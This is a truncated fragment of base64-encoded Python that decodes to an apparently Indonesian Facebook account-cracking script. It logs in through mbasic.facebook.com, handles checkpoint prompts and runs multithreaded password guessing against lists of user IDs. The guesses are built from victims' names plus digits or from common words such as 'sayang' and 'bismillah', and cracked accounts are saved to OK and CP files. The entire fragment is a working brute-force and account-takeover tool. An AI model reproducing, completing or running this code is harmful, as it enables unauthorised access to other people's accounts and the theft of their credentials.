AgaWYgX3BpbF8gaW4gWyIxIiwiMDEiXToNCiAgICAgICAgcHJpbnQoZiJ7Qn0gIikNCiAgICAgICAgbG9sb2xyPWlucHV0KGYie0h9W+KAol0gTWFzdWthbiB1c2VyIGFnZW50IFxue0l9W+KAol0gTWFzdWthbiBkaSBzaW5pIDoge0l9IikNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgb3BlbigidWEiLCJ3Iikud3JpdGUobG9sb2xyKQ0KICAgICAgICAgICAgdXNlcmE9b3BlbigidWEiLCJyIikucmVhZCgpDQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgICAgIHByaW50KGYie0J9ICIpDQogICAgICAgICAgICBwcmludChmIntCfVvigKJdIEVyb3IgOiB7S317ZX0iKQ0KICAgICAgICBpZiB1c2VyYSA9PSBsb2xvbHI6DQogICAgICAgICAgICBwcmludChmIntCfSAiKQ0KICAgICAgICAgICAgcHJpbnQoZiJ7SH1b4oCiXSBTdWtzZXMgbWVuZ2dhbnRpIik7bWVudSgpDQogICAgICAgIGVsc2U6cHJpbnQoZiJ7SH1b4oCiXXtJfSBHYWdhbCBtZW5nZ2FudGkgdXNlciBhZ2VudCAiKTtleGl0KCkNCiAgICANCiAgICBlbGlmIF9waWxfIGluIFsiMiIsIjAyIl06DQogICAgICAgIHRyeToNCiAgICAgICAgICAgIF90ZXNfdWE9b3BlbigidWEiLCJyIikucmVhZCgpDQogICAgICAgIGV4Y2VwdCBJT0Vycm9yOg0KICAgICAgICAgICAgX3Rlc191YT0oIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMTsgVEVDTk8gS0Q4KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvOTguMC40NzU1LjEwMSBNb2JpbGUgU2FmYXJpLzUzNy4zNiIpDQogICAgICAgIHByaW50KGYie0J9ICIpDQogICAgICAgIHByaW50KGYie0h9W+KAol0gVXNlciBhZ2VudCA6IHtCfXtfdGVzX3VhfSIpO21lbnUoKQ0KICAgIGVsaWYgX3BpbF8gaW4gWyIwIiwiMDAiXToNCiAgICAgICAgbWVudSgpDQogICAgZWxzZTpwcmludChmIntIfVvigKJdIFBpbGloYW4gc2FsYWggIik7ZXhpdCgpDQoNCiMjIyMjTE9HSU4gSEFTSUwNCmRlZiBsb2dfaGFzaWwodXNlciwgcGFzdyk6DQogICAgdWEgPSAiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDExOyBURUNOTyBLRDgpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS85OC4wLjQ3NTUuMTAxIE1vYmlsZSBTYWZhcmkvNTM3LjM2Ig0KICAgIHNlcyA9IHJlcXVlc3RzLlNlc3Npb24oKQ0KICAgIHNlcy5oZWFkZXJzLnVwZGF0ZSh7DQogICAgIkhvc3QiOiAibWJhc2ljLmZhY2Vib29rLmNvbSIsDQogICAgImNhY2hlLWNvbnRyb2wiOiAibWF4LWFnZT0wIiwNCiAgICAidXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyI6ICIxIiwNCiAgICAib3JpZ2luIjogaG9zdCwNCiAgICAiY29udGVudC10eXBlIjogImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIsDQogICAgInVzZXItYWdlbnQiOiB1YSwNCiAgICAiYWNjZXB0IjogInRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjkiLA0KICAgICJ4LXJlcXVlc3RlZC13aXRoIjogIm1hcmsudmlhLmdwIiwNCiAgICAic2VjLWZldGNoLXNpdGUiOiAic2FtZS1vcmlnaW4iLA0KICAgICJzZWMtZmV0Y2gtbW9kZSI6ICJuYXZpZ2F0ZSIsDQogICAgInNlYy1mZXRjaC11c2VyIjogIj8xIiwNCiAgICAic2VjLWZldGNoLWRlc3QiOiAiZG9jdW1lbnQiLA0KICAgICJyZWZlcmVyIjogaG9zdCsiL2xvZ2luLz9uZXh0JnJlZj1kYmwmZmwmcmVmaWQ9OCIsDQogICAgImFjY2VwdC1lbmNvZGluZyI6ICJnemlwLCBkZWZsYXRlIiwNCiAgICAiYWNjZXB0LWxhbmd1YWdlIjogImlkLUlELGlkO3E9MC45LGVuLVVTO3E9MC44LGVuO3E9MC43Ig0KICAgIH0pDQogICAgZGF0YSA9IHt9DQogICAgZ2VkID0gcGFyKHNlcy5nZXQoaG9zdCsiL2xvZ2luLz9uZXh0JnJlZj1kYmwmZmwmcmVmaWQ9OCIsIGhlYWRlcnM9eyJ1c2VyLWFnZW50Ijp1YX0pLnRleHQsICJodG1sLnBhcnNlciIpDQogICAgZm0gPSBnZWQuZmluZCgiZm9ybSIseyJtZXRob2QiOiJwb3N0In0pDQogICAgbGlzdCA9IFsibHNkIiwiamF6b2VzdCIsIm1fdHMiLCJsaSIsInRyeV9udW1iZXIiLCJ1bnJlY29nbml6ZWRfdHJpZXMiLCJsb2dpbiIsImJpX3hyd2giXQ0KICAgIGZvciBpIGluIGZtLmZpbmRfYWxsKCJpbnB1dCIpOg0KICAgICAgICBpZiBpLmdldCgibmFtZSIpIGluIGxpc3Q6DQogICAgICAgICAgICBkYXRhLnVwZGF0ZSh7aS5nZXQoIm5hbWUiKTppLmdldCgidmFsdWUiKX0pDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBjb250aW51ZQ0KICAgIGRhdGEudXBkYXRlKHsiZW1haWwiOnVzZXIsInBhc3MiOnBhc3d9KQ0KICAgIHRyeToNCiAgICAgICAgcnVuID0gcGFyKHNlcy5wb3N0KGhvc3QrZm0uZ2V0KCJhY3Rpb24iKSwgZGF0YT1kYXRhLCBhbGxvd19yZWRpcmVjdHM9VHJ1ZSkudGV4dCwgImh0bWwucGFyc2VyIikNCiAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Ub29NYW55UmVkaXJlY3RzOg0KICAgICAgICBwcmludChmIntCfSAiKQ0KICAgICAgICBwcmludChmIntLfVvigKJdIEFrdW4gdGVya2VuYSBzcGFtIikNCiAgICBpZiAiY191c2VyIiBpbiBzZXMuY29va2llczoNCiAgICAgICAgcHJpbnQoZiJ7SH1b4oCiXXtJfSBBa3VuIGJlcmhhc2lsIGRpIGxvZ2luIikNCiAgICBlbGlmICJjaGVja3BvaW50IiBpbiBzZXMuY29va2llczoNCiAgICAgICAgZm9ybSA9IHJ1bi5maW5kKCJmb3JtIikNCiAgICAgICAgZHRzZyA9IGZvcm0uZmluZCgiaW5wdXQiLHsibmFtZSI6ImZiX2R0c2cifSlbInZhbHVlIl0NCiAgICAgICAganpzdCA9IGZvcm0uZmluZCgiaW5wdXQiLHsibmFtZSI6Imphem9lc3QifSlbInZhbHVlIl0NCiAgICAgICAgbmggICA9IGZvcm0uZmluZCgiaW5wdXQiLHsibmFtZSI6Im5oIn0pWyJ2YWx1ZSJdDQogICAgICAgIGRhdGFEID0gew0KICAgICAgICAgICAgImZiX2R0c2ciOiBkdHNnLA0KICAgICAgICAgICAgImZiX2R0c2ciOiBkdHNnLA0KICAgICAgICAgICAgImphem9lc3QiOiBqenN0LA0KICAgICAgICAgICAgImphem9lc3QiOiBqenN0LA0KICAgICAgICAgICAgImNoZWNrcG9pbnRfZGF0YSI6IiIsDQogICAgICAgICAgICAic3VibWl0W0NvbnRpbnVlXSI6Ikxhbmp1dGthbiIsDQogICAgICAgICAgICAibmgiOiBuaA0KICAgICAgICB9DQogICAgICAgIHRlbXBlayA9IHBhcihzZXMucG9zdChob3N0K2Zvcm1bImFjdGlvbiJdLCBkYXRhPWRhdGFEKS50ZXh0LCAiaHRtbC5wYXJzZXIiKQ0KICAgICAgICBuZ2V3ID0gW3l5LnRleHQgZm9yIHl5IGluIHRlbXBlay5maW5kX2FsbCgib3B0aW9uIildDQogICAgICAgIGZvciBvcHQgaW4gcmFuZ2UobGVuKG5nZXcpKToNCiAgICAgICAgICAgIHByaW50KGYie0J9ICIpDQogICAgICAgICAgICBqYWxhbihmIntVfVt7Qn17c3RyKG9wdCsxKX17VX1de1B9LS0tPntIfVt7Qn17bmdld1tvcHRdfXtIfV0iKQ0KICAgIGVsaWYgImxvZ2luX2Vycm9yIiBpbiBzdHIocnVuKToNCiAgICAgICAgb2ggPSBydW4uZmluZCgiZGl2Iix7ImlkIjoibG9naW5fZXJyb3IifSkuZmluZCgiZGl2IikudGV4dA0KICAgICAgICBwcmludChmIntIfVvigKJde0t9fOKVpOKWuuKVpOKWuiB7b2h9IikNCiAgICBlbHNlOg0KICAgICAgICBwcmludChmIntIfVvigKJde0t9IEFrdW4gdGVyc2VidXQgc2FuZGkgbnlhIHRlbGFoIGRpIGdhbnRpIikNCmRlZiBjZWtfaGFzaWwoKToNCiAgICBwcmludChmIntCfSAiKQ0KICAgIHByaW50KGYie0J9ICIpDQogICAgcHJpbnQoZiJ7S31b4oCiXSBNYXN1a2FuIGZpbGUgY3AgIikNCiAgICBwcmludChmIntIfVvigKJdIENvbnRvaCB1bnR1ayBtYXN1a2FuIGZpbGUgOiB7S31DUC97dGFuZ2dhbH0uanNvbiIpDQogICAgcHJpbnQoZiJ7Qn0gIikNCiAgICBmaWxlcyA9aW5wdXQoZiJ7SH1b4oCiXSBNYXN1a2FuIG5hbWEgZmlsZSA6IHtJfSIpDQogICAgdHJ5Og0KICAgICAgICBidWthX2JhanUgPSBvcGVuKGZpbGVzLCdyJykucmVhZGxpbmVzKCkNCiAgICBleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3I6DQogICAgICAgIHByaW50KGYie0J9ICIpDQogICAgICAgIHByaW50KGYie0h9W+KAol17TX0gRmlsZSB0aWRhayBkaSB0ZW11a2FuIik7ZXhpdCgpDQogICAgICAgIHRpbWUuc2xlZXAoMik7IGNla19oYXNpbCgpDQogICAgcHJpbnQoZiJ7Qn0gIikNCiAgICBwcmludChmIntIfVvigKJdIFRvdGFsIGFrdW4gY2hla3BvaW50IDoge0J9e3N0cihsZW4oYnVrYV9iYWp1KSl9IikNCiAgICBwcmludChmIntCfSAiKQ0KICAgIGZvciBtZW1layBpbiBidWthX2JhanU6DQogICAgICAgIGtvbnRvbCA9IG1lbWVrLnJlcGxhY2UoIlxuIiwiIikNCiAgICAgICAgdGl0aWQgID0ga29udG9sLnNwbGl0KCIgIikNCiMgICAgICAgIHByaW50KGYie0J9ICIpDQogICAgICAgIHByaW50KGYie0h9W+KAol0gQWt1biBmYWNlYm9vayA6IHtJfXtrb250b2x9IikNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgbG9nX2hhc2lsKHRpdGlkWzBdLCB0aXRpZFsxXSkNCiAgICAgICAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOg0KICAgICAgICAgICAgY29udGludWUNCiAgICAgICAgcHJpbnQoIiIpDQogICAgcHJpbnQoZiJ7Qn0gIikNCiAgICBpbnB1dChmIntIfVvigKJde0l9IENoZWsgYWt1biBzdWRhaCBzZWxlc2FpIikNCiAgICBtZW51KCkNCg0KZGVmIGNla19yZXN1bHRzKCk6DQogICAgdHJ5Og0KICAgICAgICBvcGVuKCJPSy8lcy5qc29uIiUodGFuZ2dhbCkpDQogICAgZXhjZXB0IElPRXJyb3I6DQogICAgICAgIG9zLnN5c3RlbSgidG91Y2ggT0svJXMuanNvbiIlKHRhbmdnYWwpKQ0KICAgIHRyeToNCiAgICAgICAgb3BlbigiQ1AvJXMuanNvbiIlKHRhbmdnYWwpKQ0KICAgIGV4Y2VwdCBJT0Vycm9yOg0KICAgICAgICBvcy5zeXN0ZW0oInRvdWNoIENQLyVzLmpzb24iJSh0YW5nZ2FsKSkNCiAgICBjcD0oIkNQLyVzLmpzb24iJSh0YW5nZ2FsKSkNCiAgICBvaz0oIk9LLyVzLmpzb24iJSh0YW5nZ2FsKSkNCiAgICBoc2xfY3A9b3BlbihjcCwiciIpLnJlYWQoKQ0KICAgIGhzbF9vaz1vcGVuKG9rLCJyIikucmVhZCgpDQogICAgcHJpbnQoZiJ7SH0gICIpDQogICAgcHJpbnQoZiJ7SH0gIikNCiAgICBwcmludChmIntLfVsxXSBDZWsgcmVzdWx0cyBjcCIpDQogICAgcHJpbnQoZiJ7SX1bMl0gQ2VrIHJlc3VsdHMgb2siKQ0KICAgIHByaW50KGYie0h9WzBdIEJhY2siKQ0KICAgIHByaW50KGYie0J9ICIpDQogICAgX3BpbDNoPWlucHV0KGYie1B9W+KAol0gUGlsaWggOiB7SX0iKQ0KICAgIGlmIF9waWwzaCBpbiBbIjEiLCIwMSJdOg0KICAgICAgICBpZiBsZW4oaHNsX2NwKSAhPSAwOg0KICAgICAgICAgICAgcHJpbnQoZiJ7SH0gIikNCiAgICAgICAgICAgIHByaW50KGYie0h9W+KAol17TX0gUmVzdWx0cyBjcHtJfSIpDQogICAgICAgICAgICBvcy5zeXN0ZW0oImNhdCBDUC8lcy5qc29uIiUodGFuZ2dhbCkpDQogICAgICAgIGVsc2U6cHJpbnQoZiJ7S31b4oCiXSBUaWRhayBhZGEgaGFzaWwiKQ0KICAgIGVsaWYgX3BpbDNoIGluIFsiMiIsIjAyIl06DQogICAgICAgIGlmIGxlbihoc2xfb2spICE9IDA6DQogICAgICAgICAgICBwcmludChmIntIfSAiKQ0KICAgICAgICAgICAgcHJpbnQoZiJ7SH1b4oCiXXtJfSBSZXN1bHRzIG9rIikNCiAgICAgICAgICAgIG9zLnN5c3RlbSgiY2F0IE9LLyVzLmpzb24iJSh0YW5nZ2FsKSkNCiAgICAgICAgZWxzZTpwcmludChmIlxue0J9W+KAol17S30gVGlkYWsgYWRhIGhhc2lsIikNCiAgICBlbGlmIF9waWwzaCBpbiBbIjAiLCIwMCJdOg0KICAgICAgICBtZW51KCkNCiAgICBlbHNlOnByaW50KGYie0h9W+KAol17S30gUGlsaWFuIHRpZGFrIGFkYSIpDQoNCg0KZGVmIGZpaV94ZCgpOg0KCWtvbmUoKQ0KCXByaW50KGYie0h9ICIpDQoJcHJpbnQoZiJ7SH0gIikNCglmaWlzYXlhbmd3aWRpeWEgPWlucHV0KGYie0h9W+KAol0gUGlsaWggOiB7SX0iKQ0KCWlmIGZpaXNheWFuZ3dpZGl5YSBpbiBbIiJdOg0KCQlwcmludChmIntIfSAiKQ0KCQlwcmludChmIntIfVvigKJde0l9IFBpbGloYW4gdGlkYWsgYm9sZWgga29zb25nIik7ZXhpdCgpDQoJZWxpZiBmaWlzYXlhbmd3aWRpeWEgaW4gWyIxIiwiMDEiXToNCgkJcHJpbnQoZiJ7SH1b4oCiXSBUYW1waWxhbiBrYW4gb3BzaSBha3VuIGNoZWsgcG9pbnQge0l9WS90IikNCgkJamFsYW4oZiJ7SH1b4oCiXXtIfSBTQVJBTiBKQU5HQU4gVEFNUElMS0FOIEJJS0lOIENSQUNLIExBTUEgTU9OWUVUISEhIikNCgkJX2NoZWNrb3B0aW9uc189aW5wdXQoZiJ7SH1b4oCiXSBQaWxpaCA6IHtJfSIpDQoJCWlmIF9jaGVja29wdGlvbnNfIGluIFsieSIsIlkiXToNCgkJCXRyeToNCgkJCQlfa2V5ID0gImFuamluayINCgkJCQlrZXkgPSAiYW5qaW5rIiAjLS0tLS0gamFuZ2FuIGRpIHViYWgNCgkJCQlpZiBfa2V5IGluIGtleToNCgkJCQkJcHJpbnQoZiJ7Qn0gIikNCgkJCQkJcHJpbnQoZiJ7SH1b4oCiXSBDcmFjayBtZW5nZ3VuYWthbiBwYXNzd29yZCBtYW51YWwvZGVmYXVsdCB7SX1NL0QiKQ0KCQkJCQl0ZXIgPWlucHV0KGYie0h9W+KAol0gUGlsaWggOiB7SX0iKQ0KCQkJCQlpZiB0ZXIgaW4gWyJtIiwiTSJdOg0KCQkJCQkJd2l0aCBUaHJlYWRQb29sRXhlY3V0b3IobWF4X3dvcmtlcnM9MzApIGFzIGNvZWc6DQoJCQkJCQkJcHJpbnQoZiJ7SH0gIikNCgkJCQkJCQlwcmludChmIntIfSAiKQ0KCQkJCQkJCXByaW50KGYie0h9W+KAol0gQ29udG9oIHBhc3N3b3JkIDoge0l9c2F5YW5nLG5nZW50b3R5dWsiKQ0KCQkJCQkJCXByaW50KGYie0J9ICIpDQoJCQkJCQkJYXN1ID0gaW5wdXQoZiJ7Qn1b4oCiXSBCdWF0IHNhbmRpIDoge0l9Iikuc3BsaXQoIiwiKQ0KCQkJCQkJCWlmIGxlbihhc3UpID09IiI6DQoJCQkJCQkJCXByaW50KGYie0J9ICIpDQoJCQkJCQkJCXByaW50KGYie0h9W+KAol17SX0gU2FuZGkgdGlkYWsgYm9sZWgga29zb25nIik7ZXhpdCgpDQoJCQkJCQkJc3RhcnRlZCgpDQoJCQkJCQkJZm9yIHVzZXIgaW4gaWQ6DQoJCQkJCQkJCXVpZCwgbmFtZSA9IHVzZXIuc3BsaXQoIjw9PiIpDQoJCQkJCQkJCWNvZWcuc3VibWl0KGFwaSwgdWlkLCBhc3UpDQoJCQkJCQlleGl0KCkNCgkJCQkJZWxpZiB0ZXIgaW4gWyJkIiwiRCJdOg0KCQkJCQkJd2l0aCBUaHJlYWRQb29sRXhlY3V0b3IobWF4X3dvcmtlcnM9MzApIGFzIGNvZWc6DQoJCQkJCQkJc3RhcnRlZCgpDQoJCQkJCQkJZm9yIHVzZXIgaW4gaWQ6DQoJCQkJCQkJCXVpZCwgbmFtZSA9IHVzZXIuc3BsaXQoIjw9PiIpDQoJCQkJCQkJCWZyaXN0PW5hbWUuc3BsaXQoIiAiKQ0KCQkJCQkJCQlpZiBsZW4oZnJpc3QpPj02Og0KCQkJCQkJCQkJZmlpID0gWyBuYW1lLCBmcmlzdFswXSwgZnJpc3RbMF0rIjEyMyIsIGZyaXN0WzBdKyIxMjM0NSIsIGZyaXN0WzBdKyIxMjM0NTYiIF0NCgkJCQkJCQkJZWxpZiBsZW4oZnJpc3QpPD0yOg0KCQkJCQkJCQkJZmlpID0gWyBuYW1lLCBmcmlzdFswXSwgZnJpc3RbMF0rIjEyMyIsIGZyaXN0WzBdKyIxMjM0NSIsIGZyaXN0WzBdKyIxMjM0NTYiIF0NCgkJCQkJCQkJZWxpZiBsZW4oZnJpc3QpPD0zOg0KCQkJCQkJCQkJZmlpID0gWyBuYW1lLCBmcmlzdFswXSwgZnJpc3RbMF0rIjEyMyIsIGZyaXN0WzBdKyIxMjM0NSIsIGZyaXN0WzBdKyIxMjM0NTYiIF0NCgkJCQkJCQkJZWxzZToNCgkJCQkJCQkJCWZpaSA9IFsgImJpc21pbGxhaCIsInNheWFuZyIsImthdGFzYW5kaSIsInRlcnNlcmFoIiwia29udG9sIiwiYW5qaW5nIiwiYmFuZ3NhdCIsIixiYWppbmdhbiIsImphbmNvayIsIm1vbnlldCIsIixpbmRvbmVzaWEiIF0NCgkJCQkJCQkJY29lZy5zdWJtaXQoYXBpLCB1aWQsIGZpaSkNCgkJCQkJCWV4aXQoKQ0KCQkJCWVsc2U6cHJpbnQoZiJ7SH1b4oCiXXtNfSBFcm9yIik7ZXhpdCgpDQoJCQlleGNlcHQgKEtleUVycm9yLElPRXJyb3IpOnByaW50KGYie0J9W+KAol17SX0gRXJvciIpO2V4aXQoKQ0KDQoJCWVsc2U6DQoJCQlwcmludChmIntIfSAiKQ0KCQkJcHJpbnQoZiJ7SH1b4oCiXSBDcmFjayBtZW5nZ3VuYWthbiBwYXNzd29yZCBtYW51YWwvZGVmYXVsdCB7SX1NL0QiKQ0KCQkJcHJpbnQoZiJ7Qn0gIikNCgkJCXRlciA9aW5wdXQoZiJ7SH1b4oCiXSBQaWxpaCA6IHtJfSIpDQoJCQlpZiB0ZXIgaW4gWyJtIiwiTSJdOg0KCQkJCXdpdGggVGhyZWFkUG9vbEV4ZWN1dG9yKG1heF93b3JrZXJzPTMwKSBhcyBjb2VnOg0KCQkJCQlwcmludChmIntIfSAiKQ0KCQkJCQlwcmludChmIntIfSAiKQ0KCQkJCQlwcmludChmIntIfVvigKJdIENvbnRvaCBwYXNzd29yZCA6IHtJfXNheWFuZyxuZ2VudG90eXVrIikNCgkJCQkJcHJpbnQoZiJ7Qn0gIikNCgkJCQkJYXN1ID0gaW5wdXQoZiJ7Qn1b4oCiXSBCdWF0IHNhbmRpIDoge0l9Iikuc3BsaXQoIiwiKQ0KCQkJCQlpZiBsZW4oYXN1KSA9PSIiOg0KCQkJCQkJcHJpbnQoZiJ7SH0gIikNCgkJCQkJCXByaW50KGYie0h9ICIpDQoJCQkJCQlwcmludChmIntIfVvigKJde0l9IFNhbmRpIHRpZGFrIGJvbGVoIGtvc29uZyIpDQoJCQkJCXN0YXJ0ZWQoKQ0KCQkJCQlmb3IgdXNlciBpbiBpZDoNCgkJCQkJCXVpZCwgbmFtZSA9IHVzZXIuc3BsaXQoIjw9PiIpDQoJCQkJCQljb2VnLnN1Ym1pdChhcGksIHVpZCwgYXN1KQ0KCQkJCWV4aXQoKQ0KCQkJZWxpZiB0ZXIgaW4gWyJkIiwiRCJdOg0KCQkJCXdpdGggVGhyZWFkUG9vbEV4ZWN1dG9yKG1heF93b3JrZXJzPTMwKSBhcyBjb2VnOg0KCQkJCQlzdGFydGVkKCkNCgkJCQkJZm9yIHVzZXIgaW4gaWQ6DQoJCQkJCQl1aWQsIG5hbWUgPSB1c2VyLnNwbGl0KCI8PT4iKQ0KCQkJCQkJZnJpc3Q9bmFtZS5zcGxpdCgiICIpDQoJCQkJCQlpZiBsZW4oZnJpc3QpPj02Og0KCQkJCQkJCWZpaSA9IFsgbmFtZSwgZnJpc3RbMF0sIGZyaXN0WzBdKyIxMjMiLCBmcmlzdFswXSsiMTIzNDUiLCBmcmlzdFswXSsiMTIzNDU2IiBdDQoJCQkJCQllbGlmIGxlbihmcmlzdCk8PTI6DQoJCQkJCQkJZmlpID0gWyBuYW1lLCBmcmlzdFswXSwgZnJpc3RbMF0rIjEyMyIsIGZyaXN0WzBdKyIxMjM0NSIsIGZyaXN0WzBdKyIxMjM0NTYiIF0NCgkJCQkJCWVsaWYgbGVuKGZyaXN0KTw9MzoNCgkJCQkJCQlmaWkgPSBbIG5hbWUsIGZyaXN0WzBdLCBmcmlzdFswXSsiMTIzIiwgZnJpc3RbMF0rIjEyMzQ1IiwgZnJpc3RbMF0rIjEyMzQ1NiIgXQ0KCQkJCQkJZWxzZToNCgkJCQkJCQlmaWkgPSBbICJiaXNtaWxsYWgiLCJzYXlhbmciLCJrYXRhc2FuZGkiLCJ0ZXJzZXJhaCIsImtvbnRvbCIsImFuamluZyIsImJhbmdzYXQnLCdiYWppbmdhbicsJ2phbmNvaycsJ21vbnlldCcsJ2luZG9uZXNpYSIgXQ0KCQkJCQkJY29lZy5zdWJtaXQoYXBpaWlpLCB1aWQsIGZpaSkNCgkJCQlleGl0KCkNCg0KCWVsaWYgZmlpc2F5YW5nd2lkaXlhIGluIFsiMyIsIjAzIl06DQoJCXByaW50KGYie0h9ICIpDQoJCXByaW50KGYie0h9ICIpDQoJCXByaW50KGYie0h9W+KAol0gVGFtcGlsa2FuIG9wc2kgY2hla3BvaW50IHtJfVkvVCIpDQoJCWphbGFuKGYie0h9W+KAol17SH0gU0FSQU4gSkFOR0FOIFRBTVBJTEtBTiBCSUtJTiBDUkFDSyBMQU1BIE1PTllFVCEhISIpDQoJCV9jaGVja29wdGlvbnNfPWlucHV0KGYie0h9W+KAol0gUGlsaWggOiB7SX0iKQ0KCQlpZiBfY2hlY2tvcHRpb25zXyBpbiBbInkiLCJZIl06DQoJCQl0cnk6DQoJCQkJX2tleSA9ICJBbmppbmsiDQoJCQkJa2V5ID0gIkFuamluayINCgkJCQlpZiBfa2V5IGluIGtleToNCgkJCQkJcHJpbnQoZiJ7SH0gIikNCgkJCQkJcHJpbnQoZiJ7SH1b4oCiXSBDcmFjayBtZW5nZ3VuYWthbiBwYXNzd29yZCBtYW51YWwvZGVmYXVsdCB7SX1NL0QiKQ0KCQkJCQl0ZXIgPWlucHV0KGYie0h9W+KAol0gUGlsaWggOiB7SX0iKQ0KCQkJCQlpZiB0ZXIgaW4gWyJtIiwiTSJdOg0KCQkJCQkJd2l0aCBUaHJlYWRQb29sRXhlY3V0b3IobWF4X3dvcmtlcnM9MzApIGFzIGNvZWc6DQoJCQkJCQkJcHJpbnQoZiJ7SH0gIikNCgkJCQkJCQlwcmludChmIntIfSAiKQ0KCQkJCQkJCXByaW50KGYie0h9W+KAol0gQ29udG9oIHBhc3N3b3JkIDoge0l9c2F5YW5nLG5nZXRvdHl1ayIpDQoJCQkJCQkJcHJpbnQoZiJ7SH0gIikNCgkJCQkJCQlhc3UgPSBpbnB1dChmIntCfVvigKJdIEJ1YXQgc2FuZGkgOiB7SX0gIikuc3BsaXQoIiwiKQ0KCQkJCQkJCWlmIGxlbihhc3UpID09IiI6DQoJCQkJCQkJCXByaW50KGYie0h9ICIpDQoJCQkJCQkJCXByaW50KGYie0h9W+KAol17SX0gU2FuZGkgdGlkYWsgYm9sZWgga29zb25nIGFuamluayIpO2V4aXQoKQ0KCQkJCQkJCXN0YXJ0ZWQoKQ0KCQkJCQkJCWZvciB1c2VyIGluIGlkOg0KCQkJCQkJCQl1aWQsIG5hbWUgPSB1c2VyLnNwbGl0KCI8PT4iKQ0KCQkJCQkJCQljb2VnLnN1Ym1pdChtYmFzaWMsIHVpZCwgYXN1KQ0KCQkJCQkJZXhpdCgpDQoJCQkJCWVsaWYgdGVyIGluIFsiZCIsIkQiXToNCgkJCQkJCXdpdGggVGhyZWFkUG9vbEV4ZWN1dG9yKG1heF93b3JrZXJzPTMwKSBhcyBjb2VnOg0KCQkJCQkJCXN0YXJ0ZWQoKQ0KCQkJCQkJCWZvciB1c2VyIGluIGlkOg0KCQkJCQkJCQl1aWQsIG5hbWUgPSB1c2VyLnNwbGl0KCI8PT4iKQ0KCQkJCQkJCQlmcmlzdD1uYW1lLnNwbGl0KCIgIikNCgkJCQkJCQkJaWYgbGVuKGZyaXN0KT49NjoNCgkJCQkJCQkJCWZpaSA9IFsgbmFtZSwgZnJpc3RbMF0sIGZyaXN0WzBdKyIxMjMiLCBmcmlzdFswXSsiMTIzNDUiLCBmcmlzdFswXSsiMTIzNDU2IiBdDQoJCQkJCQkJCWVsaWYgbGVuKGZyaXN0KTw9MjoNCgkJCQkJCQkJCWZpaSA9IFsgbmFtZSwgZnJpc3RbMF0sIGZyaXN0WzBdKyIxMjMiLCBmcmlzdFswXSsiMTIzNDUiLCBmcmlzdFswXSsiMTIzNDU2IiBdDQoJCQkJCQkJCWVsaWYgbGVuKGZyaXN0KTw9MzoNCgkJCQkJCQkJCWZpaSA9IFsgbmFtZSwgZnJpc3RbMF0sIGZyaXN0WzBdKyIxMjMiLCBmcmlzdFswXSsiMTIzNDUiLCBmcmlzdFswXSsiMTIzNDU2IiBdDQoJCQkJCQkJCWVsc2U6DQoJCQkJCQkJCQlmaWkgPSBbICJiaXNtaWxsYWgiLCJzYXlhbmciLCJrYXRhc2FuZGkiLCJ0ZXJzZXJhaCIsImtvbnRvbCIsImFuamluZyIsImJhbmdzYXQnLCdiYWppbmdhbicsJ2phbmNvaycsJ21vbnlldCcsJ2luZG9uZXNpYSIgXQ0KCQkJCQkJCQljb2VnLnN1Ym1pdChtb2JpbCwgdWlkLCBmaWkpDQoJCQkJCQlleGl0KCkNCgkJCQllbHNlOnByaW50KGYie2tleX0iKTtleGl0KCkNCgkJCWV4Y2VwdCAoS2V5RXJyb3IsSU9FcnJvcik6cHJpbnQoZiJ7X2tleX0iKTtleGl0KCkNCg0KCQllbHNlOg0KCQkJcHJpbnQoZiJ7SH0gIikNCgkJCXByaW50KGYie0h9ICIpDQoJCQlwcmludChmIntIfVvigKJdIENyYWNrIG1lbmdndW5ha2FuIHBhc3dvcmQgbWFudWFsL2RlZmF1bHRzIHtJfU0vRCIpDQoJCQl0ZXIgPWlucHV0KGYie0h9W+KAol0gUGlsaWggOiB7SX0iKQ0KCQkJaWYgdGVyIGluIFsibSIsIk0iXToNCgkJCQl3aXRoIFRocmVhZFBvb2xFeGVjdXRvcihtYXhfd29ya2Vycz0zMCkgYXMgY29lZzoNCgkJCQkJcHJpbnQoZiJ7SH0gIikNCgkJCQkJcHJpbnQoZiJ7SH0gIikNCgkJCQkJcHJpbnQoZiJ7SH1b4oCiXSBDb250b2ggcGFzc3dvcmQge0l9QW5qaW5rLHNheWFuZyxuZ2VudG90eXVrIikNCgkJCQkJcHJpbnQoZiJ7SH0gIikNCgkJCQkJYXN1ID0gaW5wdXQoZiJ7SH1b4oCiXSBCdWF0IHNhbmRpIDoge0l9Iikuc3BsaXQoIiwiKQ0KCQkJCQlpZiBsZW4oYXN1KSA9PSIiOg0KCQkJCQkJcHJpbnQoZiJ7SH0gIikNCgkJCQkJCXByaW50KGYie0h9ICIpDQoJCQkJCQlwcmludChmIntIfVvigKJde0t9IFNhbmRpIHRpZGFrIGJvbGVoIGtvc29uZyBLb250b0wiKTtleGl0KCkNCgkJCQkJc3RhcnRlZCgpDQoJCQkJCWZvciB1c2VyIGluIGlkOg0KCQkJCQkJdWlkLCBuYW1lID0gdXNlci5zcGxpdCgiPD0+IikNCgkJCQkJCWNvZWcuc3VibWl0KG1iYXNpY2MsIHVpZCwgYXN1KQ0KCQkJCWV4aXQoKQ0KCQkJZWxpZiB0ZXIgaW4gWyJkIiwiRCJdOg0KCQkJCXdpdGggVGhyZWFkUG9vbEV4ZWN1dG9yKG1